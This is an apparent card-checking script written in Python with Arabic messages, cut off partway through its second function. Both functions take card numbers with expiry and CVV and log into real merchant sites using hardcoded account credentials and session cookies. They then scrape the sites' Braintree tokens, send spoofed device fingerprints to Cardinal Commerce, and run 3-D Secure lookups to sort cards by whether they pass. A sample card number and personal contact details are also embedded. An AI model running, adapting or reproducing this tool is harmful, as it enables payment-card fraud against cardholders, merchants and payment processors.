import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests
def otps(ccx):
	import requests,re,base64,jwt,json
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r=requests.session()
	user = user_agent.generate_user_agent()
	headers = {
	    'authority': 'www.luminati.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'ect': '4g',
	    'referer': 'https://www.luminati.co.uk/my-account/',
	    'sec-ch-dpr': '2.549999952316284',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-arch': '""',
	    'sec-ch-ua-bitness': '""',
	    'sec-ch-ua-full-version': '"120.0.6099.116"',
	    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-model': '"FRL-L22"',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-ch-ua-platform-version': '"10.0.0"',
	    'sec-ch-ua-wow64': '?0',
	    'sec-ch-viewport-width': '980',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://www.luminati.co.uk/my-account/', cookies=r.cookies, headers=headers)
	
	login = re.search(r'name="woocommerce-login-nonce" value="(.*?)"',response.text).group(1)
	
	headers = {
	    'authority': 'www.luminati.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'ect': '4g',
	    'origin': 'https://www.luminati.co.uk',
	    'referer': 'https://www.luminati.co.uk/my-account/',
	    'sec-ch-dpr': '2.549999952316284',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-arch': '""',
	    'sec-ch-ua-bitness': '""',
	    'sec-ch-ua-full-version': '"120.0.6099.116"',
	    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-model': '"FRL-L22"',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-ch-ua-platform-version': '"10.0.0"',
	    'sec-ch-ua-wow64': '?0',
	    'sec-ch-viewport-width': '980',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	data = {
	    'username': 'zalkmz@hi2.in',
	    'password': 'Apdlla2006$$',
	    'woocommerce-login-nonce': login,
	    '_wp_http_referer': '/my-account/',
	    'login': 'Log in',
	}
	
	response = r.post('https://www.luminati.co.uk/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	import requests
	
	cookies = {
	    'CookieConsent': '{stamp:%27VGYdH8/ZgUnCj1WhBL+sf3L/c01fegDPXSLBlaDniPM7gjIiEdco3Q==%27%2Cnecessary:true%2Cpreferences:false%2Cstatistics:false%2Cmarketing:false%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1738624269325%2Cregion:%27eg%27}',
	    'mailchimp.cart.current_email': 'zalkmz@hi2.in',
	    'mailchimp.cart.previous_email': 'zalkmz@hi2.in',
	    'mailchimp_user_email': 'zalkmz%40hi2.in',
	    'racart': 'ad287cbe-862a-4460-a91e-e2dcf19e048d',
	    'ra_customer_email': 'zalkmz@hi2.in',
	    'mailchimp_landing_site': 'https%3A%2F%2Fwww.luminati.co.uk%2Fmy-account%2F',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-02-03%2023%3A11%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.luminati.co.uk%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.luminati.co.uk%2Fmy-account%2F',
	    'sbjs_first_add': 'fd%3D2025-02-03%2023%3A11%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.luminati.co.uk%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.luminati.co.uk%2Fmy-account%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
	    'ra_customer_id': 'xri9svg8__6dc28c09-2ecf-41ac-ae17-43410d16070a',
	    'wordpress_test_cookie': 'WP%20Cookie%20check',
	    '__hstc': '75867786.12f3dea3a925ce4921e94b442adac0b9.1738624303167.1738624303167.1738624303167.1',
	    'hubspotutk': '12f3dea3a925ce4921e94b442adac0b9',
	    '__hssrc': '1',
	    'cf_clearance': 't4AsGx3sIQIW0LrJ00uyGbeSBOeB4euXl3p90cBrnBU-1738625335-1.2.1.1-7YOpnJqdKog9Ytn6SamzJ82HmRdU5I2VaLnVQzk_XSORmUhK7dzbB5p1Oz3iTmR8HZVO6FaCa5q0HMbOIdPbvJYdIqD8zkZltjEIu2W4D1ecSzu6y7zoTDoCkahyb_chA8AmeFXJQbm2YABRZIjKMOrr3sweGC1Gb91a6rkFwU1EUUNuhMyr0IHXUGKU39ZOScWB6Fzj1XrGUFd4BgpoN2QccfYqnPizoB2DpCEdUP9E._iGjxEFtLk5p4o7DvE1XHovXt1hE9mrzKxnxw2WQB0nbB_g03RKcFymO7nyq.o',
	    '_gcl_au': '1.1.1095824133.1738625342',
	    '_lscache_vary': '7338de4f718902b9944fac981fea3b7d',
	    'wordpress_logged_in_6821faf8b5d7473171b731a6497ef232': 'zalkmz%7C1738798440%7CJJjJlcNTwheW6ht4uoj3hGlD959ZoIDRp1paWiMY2JV%7C68e6b96aeaea771ecafee91888d46b6c0a42200cd41d660b3ef2685938683ec1',
	    'wfwaf-authcookie-be40cb0f998d454acea2959af33a045c': '4089%7Cother%7Cread%7Ce790cdc0c96e3e327bb4bf41ebaabcae1bfe725f3a04bddd738969eb52121a23',
	    'tinvwl_wishlists_data_counter': '0',
	    'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.luminati.co.uk%2Fmy-account%2Fpayment-methods%2F',
	    '__hssc': '75867786.9.1738624303169',
	}
	
	headers = {
	    'authority': 'www.luminati.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'ect': '4g',
	    'referer': 'https://www.luminati.co.uk/my-account/payment-methods/',
	    'sec-ch-dpr': '2.549999952316284',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-arch': '""',
	    'sec-ch-ua-bitness': '""',
	    'sec-ch-ua-full-version': '"120.0.6099.116"',
	    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-model': '"FRL-L22"',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-ch-ua-platform-version': '"10.0.0"',
	    'sec-ch-ua-wow64': '?0',
	    'sec-ch-viewport-width': '980',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://www.luminati.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers)
	
	sn = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	kol = base64.b64decode(sn).decode('utf-8')
	sni = re.findall(r'authorizationFingerprint":"(.*?)"', kol)[0]
	nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text).group(1)
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {sni}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://www.luminati.co.uk',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '563cc6b2-3612-4f3f-93ab-07b8bf3b4c06',
	    },
	    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
	    'operationName': 'ClientConfiguration',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
	
	headers = {
	    'authority': 'centinelapi.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json;charset=UTF-8',
	    'origin': 'https://www.luminati.co.uk',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	    'x-cardinal-tid': 'Tid-94049f6d-420d-4115-a598-fce7fc85b39b',
	}
	
	json_data = {
	    'BrowserPayload': {
	        'Order': {
	            'OrderDetails': {},
	            'Consumer': {
	                'BillingAddress': {},
	                'ShippingAddress': {},
	                'Account': {},
	            },
	            'Cart': [],
	            'Token': {},
	            'Authorization': {},
	            'Options': {},
	            'CCAExtension': {},
	        },
	        'SupportsAlternativePayments': {
	            'cca': True,
	            'hostedFields': False,
	            'applepay': False,
	            'discoverwallet': False,
	            'wallet': False,
	            'paypal': False,
	            'visacheckout': False,
	        },
	    },
	    'Client': {
	        'Agent': 'SongbirdJS',
	        'Version': '1.35.0',
	    },
	    'ConsumerSessionId': None,
	    'ServerJWT': cardnal,
	}
	
	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	
	payload = response.json()['CardinalJWT']
	payload_dict = jwt.decode(payload, 	options={"verify_signature": False})
	reference_id = payload_dict['ReferenceId']
	
	headers = {
	    'authority': 'geo.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://geo.cardinalcommerce.com',
	    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=63378971bbabb54f94c55f7f&tmEventType=PAYMENT&referenceId=0_efdcad8a-ea13-47e3-8781-44b2ec5b53d1&geolocation=false&origin=Songbird',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'Cookies': {
	        'Legacy': True,
	        'LocalStorage': True,
	        'SessionStorage': True,
	    },
	    'DeviceChannel': 'Browser',
	    'Extended': {
	        'Browser': {
	            'Adblock': True,
	            'AvailableJsFonts': [],
	            'DoNotTrack': 'unknown',
	            'JavaEnabled': False,
	        },
	        'Device': {
	            'ColorDepth': 24,
	            'Cpu': 'unknown',
	            'Platform': 'Linux armv81',
	            'TouchSupport': {
	                'MaxTouchPoints': 5,
	                'OnTouchStartAvailable': True,
	                'TouchEventCreationSuccessful': True,
	            },
	        },
	    },
	    'Fingerprint': 'd33b4bb49dc0838497887d66f5653448',
	    'FingerprintingTime': 1215,
	    'FingerprintDetails': {
	        'Version': '1.5.1',
	    },
	    'Language': 'ar-US',
	    'Latitude': None,
	    'Longitude': None,
	    'OrgUnitId': '63378971bbabb54f94c55f7f',
	    'Origin': 'Songbird',
	    'Plugins': [],
	    'ReferenceId': reference_id,
	    'Referrer': '',
	    'Screen': {
	        'FakedResolution': False,
	        'Ratio': 2.2216981132075473,
	        'Resolution': '942x424',
	        'UsableResolution': '942x424',
	        'CCAScreenSize': '01',
	    },
	    'CallSignEnabled': None,
	    'ThreatMetrixEnabled': False,
	    'ThreatMetrixEventType': 'PAYMENT',
	    'ThreatMetrixAlias': 'Default',
	    'TimeOffset': -120,
	    'UserAgent': user,
	    'UserAgentDetails': {
	        'FakedOS': False,
	        'FakedBrowser': False,
	    },
	    'BinSessionId': 'c0ee6d5d-d63b-46ba-82f9-422745fe0d83',
	}
	
	response = r.post(
	    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
	    cookies=r.cookies,
	    headers=headers,
	    json=json_data,
	)
	
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {sni}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '563cc6b2-3612-4f3f-93ab-07b8bf3b4c06',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '10080',
	                    'streetAddress': 'New York',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://www.luminati.co.uk',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'amount': '0.00',
	    'browserColorDepth': 24,
	    'browserJavaEnabled': False,
	    'browserJavascriptEnabled': True,
	    'browserLanguage': 'ar-US',
	    'browserScreenHeight': 942,
	    'browserScreenWidth': 424,
	    'browserTimeZone': -120,
	    'deviceChannel': 'Browser',
	    'additionalInfo': {
	        'ipAddress': '196.134.80.166',
	        'billingLine1': 'New York',
	        'billingLine2': '',
	        'billingCity': 'New York',
	        'billingState': 'NY',
	        'billingPostalCode': '10080',
	        'billingCountryCode': 'US',
	        'billingPhoneNumber': '15519828835',
	        'billingGivenName': 'Alix',
	        'billingSurname': 'Morning',
	        'email': 'zalkmz@hi2.in',
	    },
	    'challengeRequested': True,
	    'bin': '555753',
	    'dfReferenceId': reference_id,
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.106.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 431,
	        'issuerDeviceDataCollectionTimeElapsed': 505,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': sni,
	    'braintreeLibraryVersion': 'braintree/web/3.106.0',
	    '_meta': {
	        'merchantAppId': 'www.luminati.co.uk',
	        'platform': 'web',
	        'sdkVersion': '3.106.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '563cc6b2-3612-4f3f-93ab-07b8bf3b4c06',
	    },
	}
	
	response = r.post(
	    f'https://api.braintreegateway.com/merchants/vsp2vyhg3cjfwt7w/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	non = response.json()['paymentMethod']['nonce']
	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()
	
	if 'authenticate_successful' in vbv:
	       return '3DS Authenticate Successful ✅ '
	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required ❌'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
	

	
#print(otps('4430576503806466|09|2027|032'))


import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests
def otps2(ccx):
	import requests,re,base64,jwt,json
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r=requests.session()
	user = user_agent.generate_user_agent()
	headers = {
	    'authority': 'www.locoloader.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://www.locoloader.com/pricing/', cookies=r.cookies, headers=headers)
	
	client =re.search(r'authorization: ([^"]+)',response.text).group(1)
	kol = base64.b64decode(client).decode('utf-8')
	la = re.findall(r'authorizationFingerprint":"(.*?)"', kol)[0]
	
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {la}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://www.locoloader.com',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '680fb719-2a8a-45d6-aeaf-15263f96ccfc',
	    },
	    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
	    'operationName': 'ClientConfiguration',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
	
	headers = {
	    'authority': 'centinelapi.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json;charset=UTF-8',
	    'origin': 'https://www.locoloader.com',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	    'x-cardinal-tid': 'Tid-decf4ac7-e4d5-4cf7-aa42-a57ad8c46d8a',
	}
	
	json_data = {
	    'BrowserPayload': {
	        'Order': {
	            'OrderDetails': {},
	            'Consumer': {
	                'BillingAddress': {},
	                'ShippingAddress': {},
	                'Account': {},
	            },
	            'Cart': [],
	            'Token': {},
	            'Authorization': {},
	            'Options': {},
	            'CCAExtension': {},
	        },
	        'SupportsAlternativePayments': {
	            'cca': True,
	            'hostedFields': False,
	            'applepay': False,
	            'discoverwallet': False,
	            'wallet': False,
	            'paypal': False,
	            'visacheckout': False,
	        },
	    },
	    'Client': {
	        'Agent': 'SongbirdJS',
	        'Version': '1.35.0',
	    },
	    'ConsumerSessionId': '0_503e047e-d036-48a5-aab4-8dbbba5910ee',
	    'ServerJWT': cardnal,
	}
	
	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	
	payload = response.json()['CardinalJWT']
	payload_dict = jwt.decode(payload, options={"verify_signature": False})
	reference_id = payload_dict['ReferenceId']
	
	headers = {
	    'authority': 'geo.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://geo.cardinalcommerce.com',
	    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8824e5adb1562e003377a3&tmEventType=PAYMENT&referenceId=0_503e047e-d036-48a5-aab4-8dbbba5910ee&geolocation=false&origin=Songbird',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'Cookies': {
	        'Legacy': True,
	        'LocalStorage': True,
	        'SessionStorage': True,
	    },
	    'DeviceChannel': 'Browser',
	    'Extended': {
	        'Browser': {
	            'Adblock': True,
	            'AvailableJsFonts': [],
	            'DoNotTrack': 'unknown',
	            'JavaEnabled': False,
	        },
	        'Device': {
	            'ColorDepth': 24,
	            'Cpu': 'unknown',
	            'Platform': 'Linux armv81',
	            'TouchSupport': {
	                'MaxTouchPoints': 5,
	                'OnTouchStartAvailable': True,
	                'TouchEventCreationSuccessful': True,
	            },
	        },
	    },
	    'Fingerprint': 'd33b4bb49dc0838497887d66f5653448',
	    'FingerprintingTime': 1184,
	    'FingerprintDetails': {
	        'Version': '1.5.1',
	    },
	    'Language': 'ar-US',
	    'Latitude': None,
	    'Longitude': None,
	    'OrgUnitId': '5c8824e5adb1562e003377a3',
	    'Origin': 'Songbird',
	    'Plugins': [],
	    'ReferenceId': reference_id,
	    'Referrer': '',
	    'Screen': {
	        'FakedResolution': False,
	        'Ratio': 2.2216981132075473,
	        'Resolution': '942x424',
	        'UsableResolution': '942x424',
	        'CCAScreenSize': '02',
	    },
	    'CallSignEnabled': None,
	    'ThreatMetrixEnabled': False,
	    'ThreatMetrixEventType': 'PAYMENT',
	    'ThreatMetrixAlias': 'Default',
	    'TimeOffset': -120,
	    'UserAgent': user,
	    'UserAgentDetails': {
	        'FakedOS': False,
	        'FakedBrowser': False,
	    },
	    'BinSessionId': '97512e47-c106-4e5f-a4b7-bafc8961ed55',
	}
	
	response = r.post(
	    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
	    cookies=r.cookies,
	    headers=headers,
	    json=json_data,
	)
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {la}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '680fb719-2a8a-45d6-aeaf-15263f96ccfc',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
